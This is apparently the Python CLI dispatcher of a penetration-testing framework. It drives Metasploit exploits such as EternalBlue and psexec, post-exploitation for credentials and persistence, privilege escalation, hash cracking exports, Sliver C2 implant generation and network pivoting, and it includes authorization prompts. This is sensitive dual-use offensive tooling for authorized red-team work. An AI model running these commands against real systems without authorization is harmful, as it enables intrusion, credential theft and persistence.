#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║          MSF-COMMANDER v2.0 — Pentest Automation Framework              ║
║     C2 Bridge | Recon | Exploit | Privesc | Credentials | Playbooks     ║
║                                                                         ║
║  DISCLAIMER: For AUTHORIZED penetration testing ONLY.                    ║
║  Unauthorized access to computer systems is a criminal offense.         ║
╚═══════════════════════════════════════════════════════════════════════════╝

Quick Start:
    python3 msf_commander.py init "Client Corp Assessment"
    python3 msf_commander.py recon nmap 10.0.0.0/24 --ports 1-10000
    python3 msf_commander.py recon suggest
    python3 msf_commander.py exploit run exploit/windows/smb/psexec RHOSTS=10.0.0.50 LHOST=10.0.0.5
    python3 msf_commander.py privesc suggester --session 1
    python3 msf_commander.py creds list
    python3 msf_commander.py playbook run example_internal_windows
    python3 msf_commander.py report html
"""

import sys
import os
import argparse
import textwrap
from pathlib import Path

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent))

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()

# ─── Lazy Module Loading ─────────────────────────────────────────
def _load_modules():
    """Load all framework modules."""
    from core.engine import Database, EventBus, EngagementManager, TargetManager

    db = Database()
    active_eng = EngagementManager(db).get_active()

    if active_eng:
        eid = active_eng["id"]
        console.print(f"[dim]Engagement: {active_eng['name']} ({eid})[/]")
    else:
        eid = ""
        console.print("[yellow]No active engagement. Run 'init' to create one.[/]")

    events = EventBus(db, eid)
    tm = TargetManager(db, eid)

    from modules.recon import ReconModule
    from modules.exploit import ExploitManager, SessionManager, PivotManager
    from modules.privesc import PrivescModule
    from modules.vault import CredentialVault, LootManager
    from modules.c2_bridge import C2Bridge
    from modules.playbook import PlaybookEngine
    from modules.report import ReportBuilder
    from modules.automation import (
        TaskScheduler, CorrelationEngine,
        CredentialReuseTester, EngagementNotifier
    )

    modules = {
        "recon": ReconModule(db, tm, events),
        "exploit": ExploitManager(db, tm, events),
        "session": SessionManager(db, tm, events),
        "pivot": PivotManager(db, tm, events),
        "privesc": PrivescModule(db, tm, events),
        "creds": CredentialVault(db, tm, events),
        "loot": LootManager(db, tm, events),
        "c2": C2Bridge(db, tm, events),
        "playbook": PlaybookEngine(db, tm, events, {
            "recon": ReconModule(db, tm, events),
            "exploit": ExploitManager(db, tm, events),
            "session": SessionManager(db, tm, events),
            "pivot": PivotManager(db, tm, events),
            "privesc": PrivescModule(db, tm, events),
        }),
        "report": ReportBuilder(db),
        "engagement": EngagementManager(db),
        "scheduler": TaskScheduler(db, tm, events),
        "correlator": CorrelationEngine(db, tm, events),
        "cred_tester": CredentialReuseTester(db, tm, events),
        "notifier": EngagementNotifier(db, tm, events),
        "db": db,
        "events": events,
        "tm": tm,
    }

    return modules


def _check_auth():
    """Require authorization confirmation for sensitive actions."""
    try:
        from rich.prompt import Confirm
        return Confirm.ask("[bold red]Confirm you have AUTHORIZATION to perform this action?[/]", default=False)
    except Exception:
        return input("Confirm authorization (yes/no): ").strip().lower() == "yes"


def print_banner():
    console.print("""
[bold cyan]
    ╔════════════════════════════════════════════════════════╗
    ║   ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗       ║
    ║   ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝       ║
    ║   ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗       ║
    ║   ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║       ║
    ║   ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║       ║
    ║   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝       ║
    ║       Pentest Automation Framework v2.0               ║
    ╚════════════════════════════════════════════════════════╝
[/]
""")


# ═══════════════════════════════════════════════════════════════════
# CLI COMMANDS
# ═══════════════════════════════════════════════════════════════════

def cmd_init(args, m):
    """Initialize a new engagement."""
    eid = m["engagement"].create(args.name, client=args.client or "",
                                  scope=args.scope.split(",") if args.scope else [],
                                  notes=args.notes or "")
    # Reload with new engagement
    m["events"] = m["engagement"].get_active()
    console.print(f"[bold green]Engagement created: {args.name} (ID: {eid})[/]")
    if args.scope:
        console.print(f"[dim]Scope: {args.scope}[/]")


def cmd_status(args, m):
    """Show engagement status and dashboard."""
    eng = m["engagement"].get_active()
    if not eng:
        console.print("[yellow]No active engagement. Run 'init' first.[/]")
        return

    stats = m["engagement"].get_stats(eng["id"])
    console.print(Panel(
        f"Name: [bold]{eng['name']}[/]\n"
        f"Client: {eng.get('client','N/A')}\n"
        f"Started: {eng['start_time'][:19]}\n"
        f"Status: [green]{eng['status']}[/]\n"
        f"Notes: {eng.get('notes','') or 'None'}",
        title="[bold]Active Engagement[/]", border_style="cyan"
    ))

    table = Table(title="Dashboard", box=box.ROUNDED)
    table.add_column("Metric", style="cyan")
    table.add_column("Value", style="bold green", justify="right")
    for k, v in stats.items():
        if k != "severity_breakdown":
            table.add_row(k.replace("_", " ").title(), str(v))
    console.print(table)

    if stats.get("severity_breakdown"):
        sb = stats["severity_breakdown"]
        sev_table = Table(title="Vulnerability Severity", box=box.ROUNDED)
        sev_table.add_column("Severity", style="bold")
        sev_table.add_column("Count", justify="right")
        colors = {"critical": "red", "high": "yellow", "medium": "yellow", "low": "green", "info": "blue"}
        for sev, count in sb.items():
            c = colors.get(sev, "white")
            sev_table.add_row(f"[{c}]{sev.upper()}[/]", str(count))
        console.print(sev_table)


def cmd_targets(args, m):
    """Manage targets."""
    if args.list:
        m["tm"].print_targets_table()
    elif args.services:
        m["tm"].print_services_table(args.services)
    elif args.detail:
        t = m["tm"].get_target(args.detail)
        if t:
            console.print(Panel(
                f"IP: {t['ip_address']}\nHostname: {t['hostname'] or 'N/A'}\n"
                f"OS: {t['os_version'] or t['os'] or 'Unknown'}\nMAC: {t.get('mac_address','N/A')}\n"
                f"Status: {t['status']}\nTags: {t.get('tags','[]')}\n"
                f"First Seen: {t['first_seen'][:19]}\nLast Seen: {t['last_seen'][:19]}",
                title="[bold]Target Details[/]", border_style="cyan"
            ))
            m["tm"].print_services_table(args.detail)
            vulns = m["tm"].get_vulnerabilities(args.detail)
            if vulns:
                table = Table(title="Vulnerabilities", box=box.ROUNDED)
                table.add_column("Severity", style="bold")
                table.add_column("Title", style="cyan")
                table.add_column("CVE", style="yellow")
                for v in vulns:
                    table.add_row(v["severity"].upper(), v["title"][:50], v.get("cve", ""))
                console.print(table)


def cmd_recon(args, m):
    """Reconnaissance commands."""
    if args.action == "nmap":
        result = m["recon"].nmap_scan(args.target, args.ports, args.scan_type)
    elif args.action == "quick":
        result = m["recon"].nmap_quick(args.target)
    elif args.action == "stealth":
        result = m["recon"].nmap_stealth(args.target)
    elif args.action == "udp":
        result = m["recon"].nmap_udp(args.target)
    elif args.action == "smb":
        result = m["recon"].enum_smb(args.target)
    elif args.action == "dns":
        result = m["recon"].dns_enum(args.target)
    elif args.action == "headers":
        result = m["recon"].http_headers(args.target)
    elif args.action == "dirs":
        result = m["recon"].dir_bruteforce(args.target)
    elif args.action == "suggest":
        suggestions = m["recon"].suggest_exploits()
        if suggestions:
            table = Table(title="Suggested Exploits", box=box.ROUNDED)
            table.add_column("Target", style="cyan")
            table.add_column("Port", style="dim")
            table.add_column("Module", style="yellow")
            table.add_column("Check", style="white")
            for s in suggestions:
                table.add_row(s["target"], str(s.get("port", "")), s["module"], s["check"])
            console.print(table)
        return
    else:
        console.print("[yellow]Actions: nmap, quick, stealth, udp, smb, dns, headers, dirs, suggest[/]")
        return


def cmd_exploit(args, m):
    """Exploit commands."""
    if not _check_auth():
        return

    if args.action == "search":
        results = m["exploit"].search(args.query, args.type)
        if results:
            table = Table(title=f"Results: {args.query}", box=box.ROUNDED)
            table.add_column("Module", style="cyan")
            table.add_column("Rank", style="yellow")
            table.add_column("Description", style="white")
            for r in results[:40]:
                table.add_row(r["module"], r.get("rank", ""), r.get("description", "")[:60])
            console.print(table)
    elif args.action == "run":
        options = {}
        for opt in (args.options or []):
            if "=" in opt:
                k, v = opt.split("=", 1)
                options[k] = v
        payload_opts = {}
        for opt in (args.payload_opts or []):
            if "=" in opt:
                k, v = opt.split("=", 1)
                payload_opts[k] = v
        result = m["exploit"].run(args.module, options, args.payload, payload_opts)
    elif args.action == "options":
        console.print(m["exploit"].show_options(args.module))
    elif args.action == "handler":
        m["exploit"].run_handler(args.payload, args.lhost, args.lport)


def cmd_session(args, m):
    """Session management."""
    if args.action == "list":
        sessions = m["session"].list_sessions()
        if sessions:
            table = Table(title="Active MSF Sessions", box=box.ROUNDED)
            table.add_column("ID", style="cyan")
            table.add_column("Type", style="yellow")
            table.add_column("Info", style="white")
            table.add_column("Connection", style="green")
            for s in sessions:
                table.add_row(s["id"], s["type"], s["info"][:40], s["connection"][:30])
            console.print(table)
        else:
            console.print("[yellow]No active sessions.[/]")
    elif args.action == "post":
        if args.category:
            m["session"].run_post_category(args.session, args.category)
        elif args.module:
            opts = {}
            for opt in (args.options or []):
                if "=" in opt:
                    k, v = opt.split("=", 1)
                    opts[k] = v
            result = m["session"].run_post(args.session, args.module, opts)
            console.print(result["output"])
    elif args.action == "modules":
        m["session"].show_post_modules(args.category)


def cmd_privesc(args, m):
    """Privilege escalation."""
    if args.action == "suggester":
        m["privesc"].msf_local_exploit_suggester(args.session)
    elif args.action == "quick":
        m["privesc"].quick_privesc_check(args.session)
    elif args.action == "winpeas":
        m["privesc"].winpeas_scan(args.session)
    elif args.action == "parse-winpeas":
        m["privesc"].winpeas_parse(args.file)
    elif args.action == "linpeas":
        m["privesc"].linpeas_scan(args.session)
    elif args.action == "parse-linpeas":
        m["privesc"].linpeas_parse(args.file)
    elif args.action == "linenum":
        m["privesc"].linenum_scan(args.session)


def cmd_creds(args, m):
    """Credential management."""
    if args.action == "list":
        m["creds"].print_table()
    elif args.action == "add":
        m["creds"].add(args.username, password=args.password or "",
                       hash_type=args.hash_type or "", hash_val=args.hash or "",
                       source=args.source or "manual", realm=args.realm or "")
    elif args.action == "hashdump":
        import sys
        content = sys.stdin.read() if not sys.stdin.isatty() else args.file and Path(args.file).read_text()
        if content:
            m["creds"].add_from_hashdump(content, source=args.source or "hashdump")
    elif args.action == "shadow":
        content = Path(args.file).read_text() if args.file else (sys.stdin.read() if not sys.stdin.isatty() else "")
        if content:
            m["creds"].add_from_shadow(content, source=args.source or "shadow")
    elif args.action == "export-hashcat":
        m["creds"].export_hashcat()
    elif args.action == "export-john":
        m["creds"].export_john()
    elif args.action == "crack":
        m["creds"].mark_cracked(args.username, args.password)


def cmd_loot(args, m):
    """Loot management."""
    if args.action == "list":
        m["loot"].print_table(args.type)
    elif args.action == "summary":
        m["loot"].summary()


def cmd_c2(args, m):
    """C2 Bridge commands."""
    if args.action == "compare":
        m["c2"].compare_c2()
    elif args.action == "status":
        console.print("Sliver:", m["c2"].sliver_status())
        console.print("Havoc:", m["c2"].havoc_status())
    elif args.action == "sliver-generate":
        if not _check_auth():
            return
        m["c2"].sliver_generate_implant(
            os_=args.os, arch=args.arch, format_=args.format,
            c2_host=args.host, c2_port=args.port, protocol=args.protocol,
            mtls=args.mtls, wg=args.wg, output_dir=args.output_dir,
        )
    elif args.action == "havoc-guide":
        m["c2"].havoc_generate_implant(args.os, args.arch)
    elif args.action == "setup":
        m["c2"].setup_guide(args.framework)


def cmd_pivot(args, m):
    """Pivoting commands."""
    if args.action == "route":
        m["pivot"].add_route(args.session, args.subnet)
    elif args.action == "socks":
        m["pivot"].start_socks(args.session, args.version, args.port)


def cmd_playbook(args, m):
    """Playbook commands."""
    if args.action == "list":
        playbooks = m["playbook"].list_playbooks()
        if playbooks:
            for p in playbooks:
                console.print(f"  [cyan]{p}[/]")
        else:
            console.print("[yellow]No playbooks found. Run 'playbook example' to create one.[/]")
    elif args.action == "example":
        fp = m["playbook"].save_example()
    elif args.action == "run":
        pb = m["playbook"].load(args.name)
        if pb:
            if not _check_auth():
                return
            m["playbook"].execute(pb, dry_run=args.dry_run)
        else:
            console.print(f"[red]Playbook not found: {args.name}[/]")
    elif args.action == "show":
        pb = m["playbook"].load(args.name)
        if pb:
            import yaml
            console.print(yaml.dump(pb, default_flow_style=False, sort_keys=False))


def cmd_report(args, m):
    """Generate reports."""
    eng = m["engagement"].get_active()
    if not eng:
        console.print("[red]No active engagement.[/]")
        return
    m["report"].generate(eng["id"], args.format)


def cmd_vulns(args, m):
    """Vulnerability management."""
    vulns = m["tm"].get_vulnerabilities()
    if vulns:
        table = Table(title=f"All Vulnerabilities ({len(vulns)})", box=box.ROUNDED)
        table.add_column("Severity", style="bold")
        table.add_column("Target", style="cyan")
        table.add_column("Title", style="white")
        table.add_column("CVE", style="yellow")
        table.add_column("Module", style="dim")
        for v in vulns:
            sev_color = {"critical": "red", "high": "red", "medium": "yellow", "low": "green", "info": "blue"}.get(v.get("severity","").lower(), "white")
            table.add_row(f"[{sev_color}]{v['severity'].upper()}[/]",
                          v.get("ip_address", ""), v["title"][:50],
                          v.get("cve", ""), v.get("module_used", ""))
        console.print(table)
    else:
        console.print("[yellow]No vulnerabilities recorded.[/]")


def cmd_scheduler(args, m):
    """Task automation engine."""
    if args.action == "list":
        tasks = m["scheduler"].tasks
        if tasks:
            table = Table(title=f"Queued Tasks ({len(tasks)})", box=box.ROUNDED)
            table.add_column("Name", style="cyan")
            table.add_column("Action", style="yellow")
            table.add_column("Status", style="bold")
            table.add_column("Depends", style="dim")
            for t in tasks.values():
                table.add_row(t.name, t.action, t.status.value, ",".join(t.depends_on)[:30])
            console.print(table)
        else:
            console.print("[yellow]No tasks queued.[/]")
            console.print("[dim]Use 'scheduler auto-scan --target IP' to queue tasks[/]")
    elif args.action == "auto-scan":
        if not args.target:
            console.print("[red]--target required for auto-scan[/]")
            return
        m["scheduler"].auto_scan(args.target, args.ports)
    elif args.action == "auto-privesc":
        m["scheduler"].auto_privesc(args.session)
    elif args.action == "execute":
        if not m["scheduler"].tasks:
            console.print("[yellow]No tasks queued. Use auto-scan or auto-privesc first.[/]")
            return
        m["scheduler"].run_all(m, timeout_per_task=args.timeout)


def cmd_correlate(args, m):
    """Run finding correlation analysis."""
    m["correlator"].correlate()
    m["notifier"].check_milestones()


def cmd_cred_test(args, m):
    """Test credential reuse across services."""
    if not _check_auth():
        return
    services = [args.service] if args.service else None
    m["cred_tester"].test_credentials(target=args.target or "", services=services)
    m["notifier"].check_milestones()


# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(
        description="MSF-COMMANDER v2 — Pentest Automation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        Quick Start:
          python3 msf_commander.py init "Client Assessment" --scope "10.0.0.0/24"
          python3 msf_commander.py recon nmap 10.0.0.0/24
          python3 msf_commander.py recon suggest
          python3 msf_commander.py exploit run exploit/windows/smb/ms17_010_eternalblue RHOSTS=10.0.0.50 LHOST=10.0.0.5
          python3 msf_commander.py privesc suggester --session 1
          python3 msf_commander.py creds list
          python3 msf_commander.py report html
        """)
    )

    sub = parser.add_subparsers(dest="command", help="Command")

    # init
    p = sub.add_parser("init", help="Create new engagement")
    p.add_argument("name", help="Engagement name")
    p.add_argument("--client", help="Client name")
    p.add_argument("--scope", help="Comma-separated scope (e.g., 10.0.0.0/24,192.168.1.100)")
    p.add_argument("--notes", help="Additional notes")

    # status
    sub.add_parser("status", help="Show engagement dashboard")

    # targets
    p = sub.add_parser("targets", help="Manage targets")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--list", "-l", action="store_true")
    g.add_argument("--services", "-s", metavar="TARGET_ID", help="Show services for target")
    g.add_argument("--detail", "-d", metavar="TARGET_ID", help="Show target details")

    # recon
    p = sub.add_parser("recon", help="Reconnaissance")
    p.add_argument("action", choices=["nmap", "quick", "stealth", "udp", "smb", "dns", "headers", "dirs", "suggest"])
    p.add_argument("target", nargs="?", default="")
    p.add_argument("--ports", default="1-10000")
    p.add_argument("--scan-type", default="-sV -sC -O -T4")

    # exploit
    p = sub.add_parser("exploit", help="Exploit management")
    p.add_argument("action", choices=["search", "run", "options", "handler"])
    p.add_argument("query", nargs="?", default="", help="Search query or module path")
    p.add_argument("module", nargs="?", help="Module path (for run/options)")
    p.add_argument("--type", "-t", choices=["exploit", "auxiliary", "post", "payload"], default="")
    p.add_argument("--options", "-o", action="append", help="KEY=VALUE options")
    p.add_argument("--payload", "-p", help="Payload for exploit")
    p.add_argument("--payload-opts", action="append", help="Payload options KEY=VALUE")
    p.add_argument("--lhost", help="Listener host (for handler)")
    p.add_argument("--lport", type=int, default=4444, help="Listener port")

    # session
    p = sub.add_parser("session", help="Session management")
    p.add_argument("action", choices=["list", "post", "modules"])
    p.add_argument("--session", "-s", default="1")
    p.add_argument("--category", "-c", choices=["enumerate", "credentials", "persistence", "lateral", "privesc", "recon"])
    p.add_argument("--module", "-m", help="Specific post module")
    p.add_argument("--options", "-o", action="append", help="KEY=VALUE")

    # privesc
    p = sub.add_parser("privesc", help="Privilege escalation")
    p.add_argument("action", choices=["suggester", "quick", "winpeas", "parse-winpeas", "linpeas", "parse-linpeas", "linenum"])
    p.add_argument("--session", "-s", default="1")
    p.add_argument("--file", "-f", help="File to parse")

    # creds
    p = sub.add_parser("creds", help="Credential vault")
    p.add_argument("action", choices=["list", "add", "hashdump", "shadow", "export-hashcat", "export-john", "crack"])
    p.add_argument("--username", "-u")
    p.add_argument("--password", "-p")
    p.add_argument("--hash-type", "-t")
    p.add_argument("--hash", help="Hash value")
    p.add_argument("--source", "-s", default="manual")
    p.add_argument("--realm", "-r")
    p.add_argument("--file", "-f")

    # loot
    p = sub.add_parser("loot", help="Loot manager")
    p.add_argument("action", choices=["list", "summary"])
    p.add_argument("--type", "-t")

    # c2
    p = sub.add_parser("c2", help="C2 framework bridge")
    p.add_argument("action", choices=["compare", "status", "sliver-generate", "havoc-guide", "setup"],
                   default="compare")
    p.add_argument("--os", default="windows", choices=["windows", "linux", "macos"])
    p.add_argument("--arch", default="amd64")
    p.add_argument("--format", default="exe", choices=["exe", "sharedlib", "shellcode", "service"])
    p.add_argument("--host", default="", help="C2 server IP/domain")
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--protocol", default="https")
    p.add_argument("--mtls", action="store_true")
    p.add_argument("--wg", action="store_true")
    p.add_argument("--output-dir", default="payloads")
    p.add_argument("--framework", default="sliver", choices=["sliver", "havoc"])

    # pivot
    p = sub.add_parser("pivot", help="Network pivoting")
    p.add_argument("action", choices=["route", "socks"])
    p.add_argument("--session", "-s", default="1")
    p.add_argument("--subnet")
    p.add_argument("--version", type=int, default=4)
    p.add_argument("--port", type=int, default=1080)

    # playbook
    p = sub.add_parser("playbook", help="Playbook automation")
    p.add_argument("action", choices=["list", "example", "run", "show"])
    p.add_argument("name", nargs="?", help="Playbook name")
    p.add_argument("--dry-run", action="store_true", help="Show steps without executing")

    # report
    p = sub.add_parser("report", help="Generate report")
    p.add_argument("format", choices=["html", "json"], default="html")

    # vulns
    sub.add_parser("vulns", help="List all vulnerabilities")

    # scheduler
    p = sub.add_parser("scheduler", help="Task automation engine")
    p.add_argument("action", choices=["auto-scan", "auto-privesc", "execute", "list"], default="list")
    p.add_argument("--target", "-t", help="Target for auto-scan")
    p.add_argument("--ports", default="1-10000")
    p.add_argument("--session", "-s", default="1")
    p.add_argument("--timeout", type=int, default=600, help="Timeout per task (seconds)")

    # correlate
    sub.add_parser("correlate", help="Finding correlation analysis")

    # cred-test
    p = sub.add_parser("cred-test", help="Test credential reuse across services")
    p.add_argument("--target", "-t", help="Specific target")
    p.add_argument("--service", "-s", help="Specific service (smb,rdp,ssh,mysql)")

    args = parser.parse_args()

    print_banner()

    # Commands that don't need modules
    if args.command in (None,):
        parser.print_help()
        return

    # Load modules
    m = _load_modules()

    # Dispatch
    dispatch = {
        "init": cmd_init,
        "status": cmd_status,
        "targets": cmd_targets,
        "recon": cmd_recon,
        "exploit": cmd_exploit,
        "session": cmd_session,
        "privesc": cmd_privesc,
        "creds": cmd_creds,
        "loot": cmd_loot,
        "c2": cmd_c2,
        "pivot": cmd_pivot,
        "playbook": cmd_playbook,
        "report": cmd_report,
        "vulns": cmd_vulns,
        "scheduler": cmd_scheduler,
        "correlate": cmd_correlate,
        "cred-test": cmd_cred_test,
    }

    handler = dispatch.get(args.command)
    if handler:
        handler(args, m)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
